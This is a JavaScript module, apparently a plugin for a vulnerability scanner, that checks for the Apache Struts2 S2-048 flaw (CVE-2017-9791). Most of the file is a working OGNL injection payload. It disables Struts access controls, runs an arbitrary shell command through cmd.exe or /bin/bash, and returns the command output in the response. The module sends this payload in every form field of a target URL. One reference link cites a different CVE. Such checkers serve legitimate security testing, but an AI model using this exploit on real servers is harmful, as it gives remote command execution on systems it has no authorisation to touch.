
module.exports={
	tags: "struts2,048,cve-2017-9791,20179791,parms",
	des: "CVE-2017-9791,struts2 048漏洞检测",
	VulApps:[
		"https://github.com/Medicean/VulApps/tree/master/s/struts2/s2-048",
		"http://oe58q5lw3.bkt.clouddn.com/s/struts2/struts2/s2-048-1.war"
	],
	urls:[
		"https://cwiki.apache.org/confluence/display/WW/S2-048",
		"https://nvd.nist.gov/vuln/detail/CVE-2017-5638"
	],
	suport:g_szMyMsg,
	doCheck:function (url,fnCbk,parms)
	{
		var _t = this;
		var szOldUrl = url;
		if('/' == url.substr(-1))url = url.substr(0,url.length - 1);
		
		var payload = "%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)." + 
			"(#_memberAccess?(#_memberAccess=#dm):" + 
			"((#container=#context['com.opensymphony.xwork2.ActionContext.container'])." + 
			"(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))" + 
			".(#ognlUtil.getExcludedPackageNames().clear())"+ 
		 	".(#ognlUtil.getExcludedClasses().clear())" + 
			".(#context.setMemberAccess(#dm))))" + 
			".(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))" + 
			".(#cmds=(#iswin?{'cmd.exe','/c','" + g_szCmdW + "'}:{'/bin/bash','-c','" + g_szCmd + "'}))" + 
			".(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true))" + 
			".(#process=#p.start())"
			+ ".(#response=@org.apache.struts2.ServletActionContext@getResponse())"
			// + ".(#response.addHeader('struts2','_struts2_'))"
			+".(#ros=#response.getOutputStream())" + 
			".(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
	    for(var k in parms)
	    	parms[k] = g_postData || payload;


	    request(fnOptHeader({method: 'POST',uri: url,"formData":parms,"headers":{Referer:url}}),
	    	function(e,r,b)
	    {
	    	fnDoBody(b,"s2-048",szOldUrl,null,function(o)
	  			{
	  				var r = {"url":url,"send":payload};
	  				fnCbk(global.copyO2O(r,o),_t);
	  			});
	    });
	}
};